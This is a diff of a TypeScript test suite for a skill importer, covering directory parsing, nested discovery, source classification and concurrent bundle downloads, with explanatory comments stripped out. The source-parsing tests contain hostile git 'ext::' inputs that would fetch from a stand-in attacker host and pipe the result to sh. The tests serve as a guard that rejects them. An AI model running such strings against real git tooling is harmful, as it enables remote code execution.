@@ -38,17 +38,15 @@ describe('parseSkillDir', () => {
     writeFileSync(join(dir, 'scripts', 'run.sh'), 'echo hi\n', 'utf-8');
     mkdirSync(join(dir, 'references'), { recursive: true });
     writeFileSync(join(dir, 'references', 'api.md'), '# API\n', 'utf-8');
-    // Files that the old scripts/+references/-only model would have DROPPED:
-    writeFileSync(join(dir, 'config.json'), '{"a":1}\n', 'utf-8'); // root file
+    writeFileSync(join(dir, 'config.json'), '{"a":1}\n', 'utf-8');
     mkdirSync(join(dir, 'assets'), { recursive: true });
-    writeFileSync(join(dir, 'assets', 'note.txt'), 'hi\n', 'utf-8'); // non-standard subdir
+    writeFileSync(join(dir, 'assets', 'note.txt'), 'hi\n', 'utf-8');
     mkdirSync(join(dir, '.claude-plugin'), { recursive: true });
     writeFileSync(join(dir, '.claude-plugin', 'plugin.json'), '{}\n', 'utf-8');
 
     const skill = parseSkillDir(dir);
     expect(skill?.name).toBe('cool-skill');
     expect(skill?.description).toBe('Does cool things');
-    // Every file beside SKILL.md is captured, sorted, none dropped.
     expect(skill?.files.map((f) => f.relPath)).toEqual([
       '.claude-plugin/plugin.json',
       'assets/note.txt',
@@ -64,19 +62,15 @@ describe('parseSkillDir', () => {
     const dir = join(root, 'bin');
     writeSkill(dir, 'name: b\ndescription: d');
     mkdirSync(join(dir, 'assets'), { recursive: true });
-    const png = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x00, 0x01, 0xff, 0xfe]); // NUL inside
+    const png = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x00, 0x01, 0xff, 0xfe]);
     writeFileSync(join(dir, 'assets', 'logo.png'), png);
 
     const file = parseSkillDir(dir)?.files.find((f) => f.relPath === 'assets/logo.png');
-    expect(file?.content).toBeNull(); // binary → no text
+    expect(file?.content).toBeNull();
     expect(file?.bytes && Array.from(file.bytes)).toEqual(Array.from(png));
   });
 
   test('parsed files map cleanly onto the preview response schema (regression)', () => {
-    // The preview endpoint sends `parsed.files.map(f => ({relPath, content}))`
-    // through SkillPreviewSchema. A shape mismatch (e.g. a required `kind` field,
-    // non-nullable content, or raw bytes) fails Zod at runtime and the preview
-    // silently degrades to the Open Graph card. Pin the contract here.
     const dir = join(root, 'preview-shape');
     writeSkill(dir, 'name: p\ndescription: d');
     mkdirSync(join(dir, 'references'), { recursive: true });
@@ -136,11 +130,9 @@ describe('discoverSkillDirs', () => {
   });
 
   test('nested category layout (skills/<category>/<skill>/) discovered recursively', () => {
-    // mattpocock/skills shelves skills as skills/productivity/grill-me/SKILL.md
     const repo = join(root, 'nested');
     writeSkill(join(repo, 'skills', 'productivity', 'grill-me'), 'name: grill-me\ndescription: d');
     writeSkill(join(repo, 'skills', 'engineering', 'tdd'), 'name: tdd\ndescription: d');
-    // a skill's own bundle dirs must NOT be mistaken for skills
     mkdirSync(join(repo, 'skills', 'productivity', 'grill-me', 'scripts'), { recursive: true });
     writeSkill(
       join(repo, 'skills', 'productivity', 'grill-me', 'scripts', 'inner'),
@@ -172,12 +164,9 @@ describe('parseSource', () => {
   });
 
   test('rejects command-executing git transports (ext:: RCE guard)', () => {
-    // `ext::` runs an arbitrary command; the trailing `x://y` used to satisfy
-    // the old `includes('://')` check and reach `git clone`.
     expect(parseSource("ext::sh -c 'curl evil.example/p|sh' x://y")).toBeNull();
     expect(parseSource('ext::curl evil.example')).toBeNull();
     expect(parseSource('fd::17/foo')).toBeNull();
-    // Real transports still classify as git.
     expect(parseSource('ssh://git@host/o/r.git')).toEqual({
       kind: 'git',
       url: 'ssh://git@host/o/r.git',
@@ -194,7 +183,6 @@ describe('parseSource', () => {
       kind: 'git',
       url: 'http://host/o/r.git',
     });
-    // Non-allowlisted schemes are rejected, not just the RCE-class ones.
     expect(parseSource('ftp://host/o/r.git')).toBeNull();
     expect(parseSource('svn://host/o/r')).toBeNull();
   });
@@ -283,10 +271,6 @@ describe('resolveSkillsShImportSource', () => {
   });
 
   test('rejects a resolved local source (local-path smuggle)', async () => {
-    // The response `source` is untrusted; a home-rooted path would classify as
-    // a LOCAL import downstream and bypass the git-transport allowlist. (`~` is
-    // the one local shape whose first segment can also satisfy the owner match,
-    // so this exercises the guard end to end.)
     const fetchImpl = async () => ({
       ok: true,
       status: 200,
@@ -382,8 +366,6 @@ describe('fetchSource', () => {
   });
 
   test('downloads a website bundle concurrently and reuses a supplied index', async () => {
-    // Two costs made installing from a website source feel like a hang: every
-    // file downloaded one at a time, and every skill re-read the origin index.
     const origin = 'https://skills.example.com';
     const files = ['SKILL.md', 'references/a.md', 'references/b.md', 'references/c.md'];
     const index = {
@@ -399,8 +381,6 @@ describe('fetchSource', () => {
       requested.push(url);
       inFlight += 1;
       peakInFlight = Math.max(peakInFlight, inFlight);
-      // Hold every response open until all of them have been issued — which can
-      // only happen if the downloads actually overlap.
       await new Promise<void>((resolve) => {
         release.push(resolve);
         if (release.length === files.length) for (const r of release) r();
@@ -415,7 +395,6 @@ describe('fetchSource', () => {
     );
     try {
       expect(peakInFlight).toBe(files.length);
-      // The supplied index means ZERO index requests — only the bundle files.
       expect(requested.some((url) => url.includes('index.json'))).toBe(false);
       expect(requested).toHaveLength(files.length);
     } finally {
